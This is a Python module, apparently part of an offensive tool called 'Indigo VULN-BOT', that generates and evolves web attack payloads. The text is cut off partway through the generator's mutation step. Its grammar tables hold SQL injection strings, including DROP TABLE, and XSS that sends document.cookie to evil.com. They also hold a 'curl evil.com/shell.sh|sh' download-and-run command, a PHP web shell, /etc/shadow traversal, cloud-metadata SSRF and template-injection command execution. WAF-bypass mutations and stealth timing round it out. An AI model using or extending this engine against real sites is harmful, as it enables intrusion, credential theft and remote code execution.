#!/usr/bin/env python3
"""
Indigo VULN-BOT v2.0 - AI-Powered Payload & PoC Generation Engine
==================================================================
Modul terpisah untuk:
- AI Payload Generator (Grammar + Genetic + Markov + Mutation + Fuzz + Neural)
- Adaptive Learning Model (CVE & Non-CVE)
- Payload Generation berdasarkan findings (NOT static database!)
- Proof-of-Concept (PoC) script builder
- Stealth layer sandbox testing
- Evidence collection & validation

Dependency: Diimpor dan dipanggil oleh indigo_scr.py (File 1)

CHANGELOG v2.0:
- Integrated AIPayloadGenerator (6 AI techniques)
- Replaced static payload DB dengan dynamic generation
- Feedback loop untuk model improvement
- Context-aware payload evolution
"""

import os
import sys
import json
import time
import random
import string
import hashlib
import subprocess
import threading
import tempfile
import shutil
import re
import math
import base64
from datetime import datetime
from urllib.parse import urlparse, urlencode, quote
from collections import defaultdict, Counter
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Any, Optional, Tuple

# ============================================================
# KONFIGURASI VULN-BOT (Edit sesuai kebutuhan)
# ============================================================
VULN_BOT_CONFIG = {
    # --- Adaptive Learning ---
    "learning_enabled": True,
    "confidence_threshold": 0.75,
    "false_positive_rate": 0.15,
    "min_samples_for_learning": 5,
    "learning_decay": 0.95,
    
    # --- AI Payload Generation ---
    "ai_generation_enabled": True,
    "ai_methods": ["grammar", "genetic", "markov", "mutation", "fuzz"],
    "max_payloads_per_vuln": 30,        # Naik dari 10 karena AI-generated
    "payload_timeout": 30,
    "payload_delay_min": 1.0,
    "payload_delay_max": 3.0,
    
    # --- Grammar Generator ---
    "grammar_max_depth": 5,
    "grammar_variants": 20,
    
    # --- Genetic Algorithm ---
    "ga_population_size": 50,
    "ga_generations": 10,
    "ga_mutation_rate": 0.3,
    "ga_crossover_rate": 0.7,
    "ga_elite_ratio": 0.1,
    
    # --- Markov Chain ---
    "markov_order": 2,
    "markov_samples": 30,
    
    # --- Neural Network ---
    "nn_hidden_layers": (64, 32),
    "nn_learning_rate": 0.001,
    "nn_max_iter": 500,
    
    # --- Context-Aware ---
    "mutation_depth": 3,
    "response_analysis": True,
    
    # --- Fuzzing ---
    "fuzz_iterations": 100,
    "fuzz_strategies": ["boundary", "format", "encoding", "concat"],
    
    # --- Stealth Layer ---
    "stealth_enabled": True,
    "request_rotation": True,
    "rate_limit_rps": 2.0,
    "randomize_timing": True,
    "proxy_rotation": False,
    "proxy_list": [],
    
    # --- Sandbox ---
    "sandbox_enabled": True,
    "sandbox_timeout": 60,
    "sandbox_memory_limit": "512M",
    "sandbox_isolate_network": True,
    
    # --- CVE Database ---
    "cve_db_path": "./.indigo_cve_db.json",
    "cve_auto_update": True,
    "cve_update_interval": 7,
    "cve_sources": [
        "https://cve.circl.lu/cve/",
        "https://services.nvd.nist.gov/rest/json/cves/2.0"
    ],
    
    # --- PoC Generation ---
    "poc_output_dir": "./poc_output",
    "poc_formats": ["python", "curl", "bash"],
    "poc_include_evidence": True,
    "poc_validate": True,
    
    # --- Evidence Collection ---
    "evidence_screenshot": True,
    "evidence_response": True,
    "evidence_headers": True,
    "evidence_timing": True,
    
    # --- Privilege Escalation Model ---
    "priv_esc_enabled": True,
    "priv_esc_patterns": [
        "sudo", "su ", "chmod 777", "chown root",
        "setuid", "suid", "capabilities"
    ],
    
    # --- Output ---
    "output_json": True,
    "output_markdown": True,
    "output_html": False,
    "verbose": True,
}

# ============================================================
# HEAVY DEPENDENCIES
# ============================================================
HEAVY_DEPENDENCIES = [
    ("numpy", "numpy", "Statistical computation & ML", False),
    ("scipy", "scipy", "Advanced statistics & optimization", True),
    ("sklearn", "scikit-learn", "Machine learning models", True),
    ("pandas", "pandas", "Data analysis & manipulation", True),
    ("joblib", "joblib", "Model persistence & parallel processing", False),
    ("fuzzywuzzy", "fuzzywuzzy", "Fuzzy string matching", True),
    ("Levenshtein", "python-Levenshtein", "Fast string similarity", True),
    ("selenium", "selenium", "Browser automation & screenshots", True),
    ("playwright", "playwright", "Modern browser automation", True),
    ("docker", "docker", "Container sandbox execution", True),
    ("requests", "requests", "HTTP client (stealth layer)", False),
    ("httpx", "httpx", "Async HTTP client", True),
    ("aiohttp", "aiohttp", "Async HTTP untuk parallel testing", True),
]

def install_heavy_dependencies():
    """Auto-install heavy dependencies untuk VULN-BOT."""
    print("\n\033[36m" + "=" * 58)
    print("  VULN-BOT v2.0: Installing Heavy Dependencies")
    print("=" * 58 + "\033[0m")
    
    missing = []
    for import_name, pip_name, desc, optional in HEAVY_DEPENDENCIES:
        try:
            __import__(import_name)
            print(f"  \033[32m[OK]\033[0m {pip_name:<25} - {desc}")
        except ImportError:
            tag = "optional" if optional else "required"
            print(f"  \033[33m[??]\033[0m {pip_name:<25} - {desc} ({tag})")
            missing.append((pip_name, optional))
    
    if not missing:
        print("\n  All heavy dependencies installed!")
        time.sleep(1)
        return True
    
    print(f"\n  Installing {len(missing)} missing packages...")
    failed = []
    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...")
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=180
            )
            print(f"      [OK] {pip_name}")
        except Exception as e:
            print(f"      [X] {pip_name}: {e}")
            if not optional:
                failed.append(pip_name)
    
    if failed:
        print(f"\n  \033[31mFailed to install required: {failed}\033[0m")
        return False
    
    print("\n  Heavy dependencies installation complete!")
    time.sleep(1)
    return True

# Install saat diimpor
install_heavy_dependencies()

# Import heavy dependencies
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    np = None

try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.neural_network import MLPClassifier
    from sklearn.model_selection import train_test_split
    from sklearn.metrics import accuracy_score
    from sklearn.preprocessing import StandardScaler
    import joblib
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False
    joblib = None

try:
    import pandas as pd
    HAS_PANDAS = True
except ImportError:
    HAS_PANDAS = False
    pd = None

try:
    import docker
    HAS_DOCKER = True
except ImportError:
    HAS_DOCKER = False
    docker = None

try:
    import requests as req_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    req_lib = None


# ============================================================
# DATA STRUCTURES
# ============================================================
class PayloadType(Enum):
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    RCE = "rce"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    CMDI = "cmdi"
    IDOR = "idor"
    OPEN_REDIRECT = "open_redirect"
    CRLF = "crlf"
    PRIV_ESC = "priv_esc"
    CSRF = "csrf"
    AUTH_BYPASS = "auth_bypass"

@dataclass
class GeneratedPayload:
    payload: str
    payload_type: str
    generation_method: str  # grammar, genetic, markov, mutation, fuzz
    confidence: float
    metadata: Dict[str, Any] = field(default_factory=dict)
    encoding: Optional[str] = None
    context_score: float = 0.0


# ============================================================
# â–ˆâ–ˆ AI-1: GRAMMAR-BASED PAYLOAD GENERATOR                  â–ˆâ–ˆ
# ============================================================
class GrammarPayloadGenerator:
    """
    Generate payloads menggunakan Context-Free Grammar (BNF-like rules).
    """
    
    def __init__(self):
        self.grammars = self._init_grammars()
    
    def _init_grammars(self):
        return {
            PayloadType.SQLI: {
                "sqli": ["{quote}{operator}{value}{comment}", "{union}{select}", "{time_based}",
                         "{quote}{subquery}{comment}", "{stacked_query}"],
                "quote": ["'", '"', "`", "'--", '"--', "')"],
                "operator": [" OR ", " AND ", " UNION ", "=", " LIKE ", " IN "],
                "value": ["'1'='1", "1=1", "'a'='a", "NULL", "TRUE", "'x'='x'"],
                "comment": ["--", "#", "/*", "/**/", ";--", "-- -"],
                "union": [" UNION ALL SELECT ", " UNION SELECT ", " UNION DISTINCT SELECT "],
                "select": ["NULL", "1,2,3", "@@version", "table_name FROM information_schema.tables",
                          "CONCAT(user(),':',database())"],
                "time_based": ["SLEEP({delay})", "WAITFOR DELAY '0:0:{delay}'", "pg_sleep({delay})",
                              "BENCHMARK(5000000,MD5('test'))"],
                "delay": ["3", "5", "7", "10"],
                "subquery": [" AND (SELECT COUNT(*) FROM information_schema.tables)>0",
                            " AND 1=(SELECT 1)"],
                "stacked_query": ["'; DROP TABLE test--", "'; INSERT INTO logs VALUES('pwned')--"],
            },
            
            PayloadType.XSS: {
                "xss": ["{tag}{event}={action}", "{injection}{script}", "{svg}{onload}",
                       "{event_handler}", "{data_uri}"],
                "tag": ["<img", "<svg", "<iframe", "<body", "<input", "<details", "<marquee"],
                "event": ["onerror", "onload", "onmouseover", "onfocus", "onclick", "onmouseenter"],
                "action": ["alert(1)", "confirm(1)", "prompt(1)", "javascript:alert(1)",
                          "fetch('//evil.com/'+document.cookie)"],
                "injection": ["\"><", "'><", "javascript:", "data:text/html,", "\" autofocus "],
                "script": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                          "<script/src=//evil.com/x.js>"],
                "svg": ["<svg", "<svg/onload", "<svg><script>", "<svg><animate"],
                "onload": ["=alert(1)>", "=confirm(1)>", "=prompt(1)>"],
                "event_handler": ["<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
                                 "<details open ontoggle=alert(1)>"],
                "data_uri": ["data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
            },
            
            PayloadType.LFI: {
                "lfi": ["{traversal}{file}", "{filter}{resource}", "{null_byte}",
                       "{wrapper}{target}", "{double_encode}"],
                "traversal": ["../", "..\\", "....//", "%2e%2e%2f", "..%252f",
                             "../../../", "..%c0%af"],
                "file": ["etc/passwd", "windows/win.ini", "proc/self/environ",
                        "etc/shadow", "proc/version"],
                "filter": ["php://filter/convert.base64-encode/resource="],
                "resource": ["index", "config", "database", "wp-config", ".htaccess"],
                "null_byte": ["%00", "\\0", "\\x00"],
                "wrapper": ["php://input", "data://text/plain,", "expect://", "zip://"],
                "target": ["<?php phpinfo(); ?>", "base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="],
                "double_encode": ["%252e%252e%252f", "%252e%252e/"],
            },
            
            PayloadType.RCE: {
                "rce": ["{separator}{command}", "{backtick}{command}", "{subshell}",
                       "{php_exec}", "{deserialization}"],
                "separator": [";", "|", "&&", "||", "&", "\n", "%0a"],
                "command": ["id", "whoami", "uname -a", "cat /etc/passwd", "ls -la",
                           "curl http://evil.com/shell.sh|sh"],
                "backtick": ["`", "$("],
                "subshell": ["$(command)", "`command`", "|command|"],
                "php_exec": ["<?php system('id'); ?>", "<?=`id`?>",
                            "<?php echo shell_exec($_GET['cmd']); ?>"],
                "deserialization": ["O:8:\"stdClass\":0:{}", "a:1:{i:0;s:2:\"id\";}"],
            },
            
            PayloadType.SSRF: {
                "ssrf": ["{protocol}{host}{port}", "{cloud_metadata}", "{internal}",
                        "{dns_rebind}", "{url_parser}"],
                "protocol": ["http://", "https://", "ftp://", "file://", "gopher://", "dict://"],
                "host": ["127.0.0.1", "localhost", "[::1]", "0.0.0.0", "0x7f000001"],
                "port": [":22", ":80", ":443", ":3306", ":6379", ":8080", ":9200"],
                "cloud_metadata": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/v1/",
                    "http://100.100.100.200/latest/meta-data/"
                ],
                "internal": ["http://localhost:8080/admin", "http://127.0.0.1:9200/_cluster/health",
                            "http://127.0.0.1:6379/INFO"],
                "dns_rebind": ["http://spoofed.burpcollaborator.net", "http://127.1.1.1"],
                "url_parser": ["http://evil.com@127.0.0.1", "http://127.0.0.1\\@evil.com"],
            },
            
            PayloadType.CMDI: {
                "cmdi": ["{sep}{cmd}", "{newline}{cmd}", "{pipe}{cmd}", "{backtick_cmd}"],
                "sep": [";", "&&", "||", "&", "|", "%26%26", "%7C%7C"],
                "newline": ["%0a", "\\n", "\n", "%0d%0a"],
                "pipe": ["|", "|&", "%7C"],
                "cmd": ["id", "whoami", "sleep 5", "ping -c 3 127.0.0.1",
                       "nslookup evil.com", "curl evil.com"],
                "backtick_cmd": ["`id`", "$(id)", "$(sleep 5)"],
            },
            
            PayloadType.SSTI: {
                "ssti": ["{open}{expr}{close}", "{jinja}", "{twig}", "{freemarker}", "{velocity}"],
                "open": ["{{", "{%", "<%=", "#{", "${", "<#"],
                "expr": ["7*7", "config", "self.__init__.__globals__", "request.application",
                        "49*2", "range(10)"],
                "close": ["}}", "%}", "%>", "}", "}>", ">"],
                "jinja": ["{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
                         "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],
                "twig": ["{{_self.env.display('id')}}", "{{['id']|map('system')}}",
                        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
                "freemarker": ["<#assign x=7*7>${x}", "${7*7}",
                              "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"],
                "velocity": ["#set($x=7*7)$x", "#set($s='')$s.getClass().forName('java.lang.Runtime')"],
            },
        }
    
    def generate(self, payload_type: PayloadType, count: int = 10) -> List[str]:
        """Generate payloads dari grammar rules."""
        if payload_type not in self.grammars:
            return []
        
        grammar = self.grammars[payload_type]
        root_rule = payload_type.value if payload_type.value in grammar else list(grammar.keys())[0]
        
        payloads = set()
        attempts = 0
        max_attempts = count * 5
        
        while len(payloads) < count and attempts < max_attempts:
            attempts += 1
            try:
                payload = self._expand_rule(grammar, root_rule, depth=0)
                if payload and len(payload.strip()) > 0:
                    payloads.add(payload)
            except Exception:
                continue
        
        return list(payloads)[:count]
    
    def _expand_rule(self, grammar: Dict, rule: str, depth: int) -> str:
        if depth > VULN_BOT_CONFIG["grammar_max_depth"]:
            return rule
        
        if rule not in grammar:
            return rule
        
        variant = random.choice(grammar[rule])
        placeholders = re.findall(r'\{(\w+)\}', variant)
        
        result = variant
        for placeholder in placeholders:
            expanded = self._expand_rule(grammar, placeholder, depth + 1)
            result = result.replace(f"{{{placeholder}}}", expanded, 1)
        
        return result


# ============================================================
# â–ˆâ–ˆ AI-2: GENETIC ALGORITHM PAYLOAD EVOLVER                â–ˆâ–ˆ
# ============================================================
class GeneticPayloadEvolver:
    """
    Evolve payloads menggunakan genetic algorithm.
    """
    
    def __init__(self):
        self.config = VULN_BOT_CONFIG
    
    def evolve(self, seed_payloads: List[str], fitness_func, generations: int = None) -> List[str]:
        generations = generations or self.config["ga_generations"]
        population_size = self.config["ga_population_size"]
        
        population = seed_payloads[:population_size]
        while len(population) < population_size:
            parent = random.choice(seed_payloads)
            child = self._mutate(parent)
            population.append(child)
        
        for gen in range(generations):
            fitness_scores = [(p, fitness_func(p)) for p in population]
            fitness_scores.sort(key=lambda x: x[1], reverse=True)
            
            elite_count = int(population_size * self.config["ga_elite_ratio"])
            elites = [p for p, _ in fitness_scores[:elite_count]]
            
            next_gen = elites.copy()
            
            while len(next_gen) < population_size:
                parent1 = self._tournament_select(fitness_scores)
                parent2 = self._tournament_select(fitness_scores)
                
                if random.random() < self.config["ga_crossover_rate"]:
                    child = self._crossover(parent1, parent2)
                else:
                    child = parent1
                
                if random.random() < self.config["ga_mutation_rate"]:
                    child = self._mutate(child)
                
                next_gen.append(child)
            
            population = next_gen
        
        final_scores = [(p, fitness_func(p)) for p in population]
        final_scores.sort(key=lambda x: x[1], reverse=True)
        
        return [p for p, _ in final_scores[:len(seed_payloads)]]
    
    def _tournament_select(self, fitness_scores, k=3):
        tournament = random.sample(fitness_scores, min(k, len(fitness_scores)))
        winner = max(tournament, key=lambda x: x[1])
        return winner[0]
    
    def _crossover(self, parent1, parent2):
        if len(parent1) < 2 or len(parent2) < 2:
            return parent1
        point1 = random.randint(1, len(parent1) - 1)
        point2 = random.randint(1, len(parent2) - 1)
        return parent1[:point1] + parent2[point2:]
    
    def _mutate(self, payload):
        if not payload:
            return payload
        
        strategy = random.choice(["char_replace", "insert", "delete", "swap", "encode"])
        
        if strategy == "char_replace":
            pos = random.randint(0, len(payload) - 1)
            char = random.choice(string.ascii_letters + string.digits + "!@#$%^&*()")
            return payload[:pos] + char + payload[pos+1:]
        
        elif strategy == "insert":
            pos = random.randint(0, len(payload))
            char = random.choice(string.ascii_letters + string.digits + "!@#$%^&*()")
            return payload[:pos] + char + payload[pos:]
        
        elif strategy == "delete" and len(payload) > 1:
            pos = random.randint(0, len(payload) - 1)
            return payload[:pos] + payload[pos+1:]
        
        elif strategy == "swap" and len(payload) > 1:
            pos1 = random.randint(0, len(payload) - 1)
            pos2 = random.randint(0, len(payload) - 1)
            chars = list(payload)
            chars[pos1], chars[pos2] = chars[pos2], chars[pos1]
            return "".join(chars)
        
        elif strategy == "encode":
            enc = random.choice(["url", "hex", "unicode", "base64"])
            return self._encode_payload(payload, enc)
        
        return payload
    
    def _encode_payload(self, payload, encoding):
        if encoding == "url":
            return quote(payload)
        elif encoding == "hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        return payload


# ============================================================
# â–ˆâ–ˆ AI-3: MARKOV CHAIN PAYLOAD GENERATOR                   â–ˆâ–ˆ
# ============================================================
class MarkovPayloadGenerator:
    """
    Generate payloads menggunakan Markov Chain.
    """
    
    def __init__(self, order: int = None):
        self.order = order or VULN_BOT_CONFIG["markov_order"]
        self.char_model = defaultdict(Counter)
        self.token_model = defaultdict(Counter)
        self.trained = False
    
    def train(self, payloads: List[str]):
        for payload in payloads:
            for i in range(len(payload) - self.order):
                state = payload[i:i+self.order]
                next_char = payload[i+self.order]
                self.char_model[state][next_char] += 1
            
            tokens = re.split(r'([<>"\'(){}[$$|&;=])', payload)
            tokens = [t for t in tokens if t]
            for i in range(len(tokens) - self.order):
                state = tuple(tokens[i:i+self.order])
                next_token = tokens[i+self.order]
                self.token_model[state][next_token] += 1
        
        self.trained = True
    
    def generate_char(self, length=50, seed=""):
        if not self.trained:
            return ""
        
        if not seed:
            seeds = [k for k in self.char_model.keys() if len(k) == self.order]
            if not seeds:
                return ""
            seed = random.choice(seeds)
        
        result = seed
        for _ in range(length - len(seed)):
            state = result[-self.order:]
            if state not in self.char_model:
                break
            
            next_chars = self.char_model[state]
            total = sum(next_chars.values())
            r = random.uniform(0, total)
            cumsum = 0
            for char, count in next_chars.items():
                cumsum += count
                if cumsum >= r:
                    result += char
                    break
        
        return result
    
    def generate_token(self, max_tokens=10, seed=None):
        if not self.trained:
            return ""
        
        if not seed:
            seeds = [k for k in self.token_model.keys() if len(k) == self.order]
            if not seeds:
                return ""
            seed = random.choice(seeds)
        
        result = list(seed)
        for _ in range(max_tokens - len(seed)):
            state = tuple(result[-self.order:])
            if state not in self.token_model:
                break
            
            next_tokens = self.token_model[state]
            total = sum(next_tokens.values())
            r = random.uniform(0, total)
            cumsum = 0
            for token, count in next_tokens.items():
                cumsum += count
                if cumsum >= r:
                    result.append(token)
                    break
        
        return "".join(result)
    
    def generate(self, count=10, method="mixed"):
        payloads = set()
        for _ in range(count * 2):
            if method == "char" or (method == "mixed" and random.random() > 0.5):
                payload = self.generate_char()
            else:
                payload = self.generate_token()
            
            if payload and len(payload) > 3:
                payloads.add(payload)
            
            if len(payloads) >= count:
                break
        
        return list(payloads)[:count]


# ============================================================
# â–ˆâ–ˆ AI-4: CONTEXT-AWARE PAYLOAD MUTATOR                    â–ˆâ–ˆ
# ============================================================
class ContextAwareMutator:
    """
    Mutate payloads berdasarkan context.
    """
    
    def __init__(self):
        self.mutation_rules = self._init_mutation_rules()
    
    def _init_mutation_rules(self):
        return {
            "waf_bypass": [
                ("'", "%27"), ("<", "%3C"), (">", "%3E"),
                (" ", "%20"), ("(", "%28"), (")", "%29"),
                ("'", "\\'"), ("<", "\\u003c"),
                ("script", "scr\\ipt"), ("alert", "al\\ert"),
                ("select", "se/**/lect"), ("union", "un/**/ion"),
            ],
            "mysql": [
                ("SLEEP", "BENCHMARK"), ("--", "#"),
                ("UNION", "UNION ALL"),
            ],
            "postgresql": [
                ("SLEEP", "pg_sleep"),
            ],
            "mssql": [
                ("SLEEP", "WAITFOR DELAY"),
            ],
            "php": [
                ("../../../", "....//....//....//"),
                ("/etc/passwd", "php://filter/convert.base64-encode/resource="),
            ],
            "java": [
                ("../../../", "..\\..\\"),
                ("/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts"),
            ],
            "json_param": [
                ("payload", '{"value": "payload"}'),
                ("payload", '{"$gt": ""}'),
            ],
            "xml_param": [
                ("payload", "<![CDATA[payload]]>"),
            ],
        }
    
    def mutate(self, payload: str, context: Dict[str, Any]) -> List[str]:
        mutations = [payload]
        
        if context.get("waf_detected"):
            for old, new in self.mutation_rules["waf_bypass"]:
                if old in payload:
                    mutated = payload.replace(old, new)
                    mutations.append(mutated)
        
        tech_stack = context.get("tech_stack", [])
        for tech in tech_stack:
            tech_key = tech.lower()
            if tech_key in self.mutation_rules:
                for old, new in self.mutation_rules[tech_key]:
                    if old in payload:
                        mutated = payload.replace(old, new)
                        mutations.append(mutated)
        
        param_type = context.get("param_type", "get")
        if param_type in self.mutation_rules:
            for old, new in self.mutation_rules[param_type]:
                if old in payload:
                    mutated = payload.replace(old, new)
                    mutations.append(mutated)
        
        failed_payloads = context.get("failed_payloads", [])
        if failed_payloads:
            filtered_patterns = self._analyze_filtered_patterns(failed_payloads)
            for pattern in filtered_patterns:
                encoded = self._encode_pattern(pattern)
                mutated = payload.replace(pattern, encoded)
                if mutated != payload:
                    mutations.append(mutated)
        
        for _ in range(3):
            mutated = self._random_mutation(payload)
            mutations.append(mutated)
        
        return list(set(mutations))[:VULN_BOT_CONFIG["mutation_depth"] * 5]
    
    def _analyze_filtered_patterns(self, failed_payloads):
        patterns = []
        for payload in failed_payloads:
            if "'" in payload: patterns.append("'")
            if "<" in payload: patterns.append("<")
            if "script" in payload.lower(): patterns.append("script")
            if "union" in payload.lower(): patterns.append("union")
        return list(set(patterns))
    
    def _encode_pattern(self, pattern):
        encodings = [
            lambda p: "".join(f"%{ord(c):02x}" for c in p),
            lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
            lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        ]
        return random.choice(encodings)(pattern)
    
    def _random_mutation(self, payload):
        if not payload:
            return payload
        mutations = [
            lambda p: p + random.choice(["#", "--", "/*", "//"]),
            lambda p: random.choice([" ", "\t", "\n"]) + p,
            lambda p: p.replace(" ", random.choice(["\t", "%20", "+"])),
            lambda p: p.upper() if random.random() > 0.5 else p.lower(),
        ]
        return random.choice(mutations)(payload)


# ============================================================
# â–ˆâ–ˆ AI-5: NEURAL NETWORK PAYLOAD SCORER                    â–ˆâ–ˆ
# ============================================================
class NeuralPayloadScorer:
    """
    Score payloads menggunakan neural network.
    """
    
    def __init__(self):
        self.model = None
        self.scaler = StandardScaler() if HAS_SKLEARN else None
        self.trained = False
    
    def extract_features(self, payload: str) -> List[float]:
        features = []
        
        features.append(len(payload))
        features.append(payload.count("'"))
        features.append(payload.count('"'))
        features.append(payload.count("<"))
        features.append(payload.count(">"))
        features.append(payload.count("("))
        features.append(payload.count(")"))
        features.append(payload.count(";"))
        features.append(payload.count("|"))
        features.append(payload.count("&"))
        features.append(payload.count("="))
        features.append(payload.count("%"))
        features.append(payload.count("\\"))
        features.append(payload.count("0x"))
        
        keywords = ["select", "union", "script", "alert", "onerror", "onload",
                    "exec", "system", "eval", "base64", "sleep", "waitfor"]
        for kw in keywords:
            features.append(1 if kw in payload.lower() else 0)
        
        entropy = self._calculate_entropy(payload)
        features.append(entropy)
        
        return features
    
    def _calculate_entropy(self, text):
        if not text:
            return 0.0
        counter = Counter(text)
        length = len(text)
        entropy = 0.0
        for count in counter.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy
    
    def train(self, payloads, labels):
        if not HAS_SKLEARN:
            return
        if len(payloads) < 10:
            return
        
        X = [self.extract_features(p) for p in payloads]
        X = np.array(X)
        y = np.array(labels)
        
        X_scaled = self.scaler.fit_transform(X)
        
        self.model = MLPClassifier(
            hidden_layer_sizes=VULN_BOT_CONFIG["nn_hidden_layers"],
            learning_rate_init=VULN_BOT_CONFIG["nn_learning_rate"],
            max_iter=VULN_BOT_CONFIG["nn_max_iter"],
            random_state=42
        )
        self.model.fit(X_scaled, y)
        self.trained = True
    
    def score(self, payload):
        if not self.trained or not HAS_SKLEARN:
            return self._heuristic_score(payload)
        
        features = self.extract_features(payload)
        features_scaled = self.scaler.transform([features])
        
        proba = self.model.predict_proba(features_scaled)[0]
        return proba[1] if len(proba) > 1 else proba[0]
    
    def _heuristic_score(self, payload):
        score = 0.5
        length = len(payload)
        if 10 <= length <= 100:
            score += 0.1
        
        special_chars = sum(payload.count(c) for c in "'\"<>();|&=")
        if special_chars > 0:
            score += 0.1
        
        keywords = ["select", "union", "script", "alert", "sleep", "exec"]
        if any(kw in payload.lower() for kw in keywords):
            score += 0.1
        
        if "%" in payload or "\\" in payload:
            score += 0.1
        
        entropy = self._calculate_entropy(payload)
        if entropy > 3.5:
            score += 0.1
        
        return min(1.0, max(0.0, score))


# ============================================================
# â–ˆâ–ˆ AI-6: SMART FUZZING ENGINE                             â–ˆâ–ˆ
# ============================================================
class SmartFuzzingEngine:
    """
    Smart fuzzing dengan heuristics.
    """
    
    def __init__(self):
        self.fuzz_vectors = self._init_fuzz_vectors()
    
    def _init_fuzz_vectors(self):
        return {
            "boundary": [
                "0", "-1", "1", "2147483647", "-2147483648",
                "255", "256", "65535", "65536",
                "", " ", "\t", "\n", "\r\n",
                "null", "NULL", "undefined", "NaN",
                "true", "false", "TRUE", "FALSE",
            ],
            "format": [
                "%s", "%d", "%x", "%n", "%p",
                "{{7*7}}", "${7*7}", "<%=7*7%>",
                "{0}", "{1}", "{{}}",
            ],
            "encoding": [
                "%00", "%0a", "%0d", "%20", "%27", "%22", "%3c", "%3e",
                "\\x00", "\\n", "\\r", "\\t",
                "\\u0000", "\\u003c", "\\u003e",
            ],
            "concat": [
                "a" * 1000, "a" * 10000,
                "'" + "a" * 100 + "'",
                "<" + "a" * 100 + ">",
            ],
            "special": [
                "{{", "}}", "{%", "%}", "${", "#{",
                "<?", "?>", "<%", "%>",
                "<!--", "-->", "<![CDATA[", "]]>",
            ],
        }
    
    def fuzz(self, base_payload, strategies=None, count=50):
        strategies = strategies or VULN_BOT_CONFIG["fuzz_strategies"]
        fuzzed = set()
        
        for strategy in strategies:
            if strategy not in self.fuzz_vectors:
                continue
            
            vectors = self.fuzz_vectors[strategy]
            for vector in vectors:
                fuzzed.add(vector + base_payload)
                fuzzed.add(base_payload + vector)
                
                if base_payload:
                    for i in range(0, len(base_payload), max(1, len(base_payload) // 5)):
                        fuzzed.add(base_payload[:i] + vector + base_payload[i:])
                
                if len(fuzzed) >= count:
                    break
            
            if len(fuzzed) >= count:
                break
        
        return list(fuzzed)[:count]


# ============================================================
# â–ˆâ–ˆ AI ORCHESTRATOR: MAIN AI PAYLOAD GENERATOR             â–ˆâ–ˆ
# ============================================================
class AIPayloadGenerator:
    """
    Main orchestrator yang combine semua AI techniques.
    """
    
    def __init__(self):
        self.grammar_gen = GrammarPayloadGenerator()
        self.genetic_evolver = GeneticPayloadEvolver()
        self.markov_gen = MarkovPayloadGenerator()
        self.context_mutator = ContextAwareMutator()
        self.neural_scorer = NeuralPayloadScorer()
        self.fuzzing_engine = SmartFuzzingEngine()
        
        self.training_payloads = defaultdict(list)
        self.training_labels = defaultdict(list)
        self.generation_stats = defaultdict(int)
    
    def add_training_data(self, payload: str, vuln_type: str, success: bool):
        """Add training data untuk improve model."""
        self.training_payloads[vuln_type].append(payload)
        self.training_labels[vuln_type].append(1 if success else 0)
        
        if len(self.training_payloads[vuln_type]) >= 20:
            self.neural_scorer.train(
                self.training_payloads[vuln_type],
                self.training_labels[vuln_type]
            )
    
    def generate(
        self,
        vuln_type: PayloadType,
        context: Dict[str, Any] = None,
        count: int = 50,
        methods: List[str] = None
    ) -> List[GeneratedPayload]:
        """
        Generate payloads menggunakan multiple AI techniques.
        """
        context = context or {}
        methods = methods or VULN_BOT_CONFIG["ai_methods"]
        
        all_payloads = []
        
        # 1. Grammar-based generation
        if "grammar" in methods:
            grammar_payloads = self.grammar_gen.generate(vuln_type, count // 5)
            for p in grammar_payloads:
                all_payloads.append(GeneratedPayload(
                    payload=p,
                    payload_type=vuln_type.value,
                    generation_method="grammar",
                    confidence=0.7,
                    metadata={"source": "grammar_rules"}
                ))
            self.generation_stats["grammar"] += len(grammar_payloads)
        
        # 2. Markov chain generation
        if "markov" in methods and all_payloads:
            seed_payloads = [p.payload for p in all_payloads[:10]]
            self.markov_gen.train(seed_payloads)
            markov_payloads = self.markov_gen.generate(count // 5)
            for p in markov_payloads:
                all_payloads.append(GeneratedPayload(
                    payload=p,
                    payload_type=vuln_type.value,
                    generation_method="markov",
                    confidence=0.6,
                    metadata={"source": "markov_chain"}
                ))
            self.generation_stats["markov"] += len(markov_payloads)
        
        # 3. Genetic algorithm evolution
        if "genetic" in methods and all_payloads:
            seed_payloads = [p.payload for p in all_payloads[:10]]
            
            def fitness_func(payload):
                return self.neural_scorer.score(payload)
            
            evolved_payloads = self.genetic_evolver.evolve(
                seed_payloads, fitness_func, generations=5
            )
            for p in evolved_payloads:
                all_payloads.append(GeneratedPayload(
                    payload=p,
                    payload_type=vuln_type.value,
                    generation_method="genetic",
                    confidence=0.8,
                    metadata={"source": "genetic_algorithm"}
                ))
            self.generation_stats["genetic"] += len(evolved_payloads)
        
        # 4. Context-aware mutation
        if "mutation" in methods and all_payloads:
            base_payloads = [p.payload for p in all_payloads[:5]]
            for base in base_payloads:
                mutated = self.context_mutator.mutate(base, context)
                for p in mutated[:3]:
